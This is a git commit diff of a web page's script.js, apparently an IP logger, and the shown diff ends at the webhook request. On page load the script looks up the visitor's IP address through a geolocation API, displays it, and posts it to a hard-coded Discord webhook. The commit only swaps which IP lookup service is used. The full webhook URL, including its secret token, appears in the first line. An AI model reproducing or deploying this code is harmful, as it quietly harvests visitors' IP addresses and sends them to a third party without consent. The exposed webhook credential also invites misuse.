a586c58acaa930503b9c75e23b9c25401269cb96
EphRex <128737077+EphRex@users.noreply.github.com>
2024-06-03 23:06:20 +0100

    Update script.js

--- script.js
+++ script.js
@@ -1,13 +1,13 @@
 const whurl = "https://discord.com/api/webhooks/1246559249325097052/UzuMt97coTW1187qKif_WXZnHvLg4n-1C_M0NsBYtP2OBDDVv5RbZy3IZZMh33lzagkB";
 
-fetch("http://ip-api.com/json/")
+fetch("https://api.techniknews.net/ipgeo/")
     .then(response => response.json())
     .then(json => {
-        const query = json.query;
-        document.getElementById("query").innerText = query;
+        const ip = json.ip;
+        document.getElementById("ip").innerText = ip;
 
         const msg = {
-            content: `query - \${query}\n query - \${query}\n query - \${query}`
+            content: `query - \${ip}\n query - \${ip}\n query - \${ip}`
         };
 
         return fetch(whurl + "?wait=true", {
